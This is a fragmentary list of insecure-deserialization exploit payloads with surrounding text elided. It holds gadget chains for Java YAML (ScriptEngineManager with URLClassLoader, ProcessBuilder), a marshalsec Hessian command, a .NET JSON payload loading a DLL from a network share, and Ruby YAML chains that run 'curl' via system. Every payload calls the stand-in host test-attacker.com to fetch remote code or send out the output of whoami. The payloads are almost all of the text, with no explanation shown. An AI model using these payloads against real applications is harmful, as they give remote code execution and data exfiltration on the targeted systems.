...
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://test-attacker.com/exploit.jar"]
  ]]
]
```
...
!!sun.misc.Service [
  !!java.lang.ProcessBuilder [["curl", "http://test-attacker.com/pwned"]]
]
...
java -cp marshalsec.jar marshalsec.Hessian \
  ...
  "ldap://test-attacker.com:1389/Exploit"
...
// Triggers assembly load from attacker-controlled path
{
  ...
  "Path": "\\\\test-attacker.com\\share\\payload.dll"
}
```
  ...
  specs:
    - !ruby/object:Gem::Source
      current_fetch_uri: !ruby/object:URI::Generic
        path: "| curl http://test-attacker.com/pwned"
```
    ...
    debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          ...
          method_id: :system
        git_set: "curl http://test-attacker.com/$(whoami)"
      method_id: :resolve
```
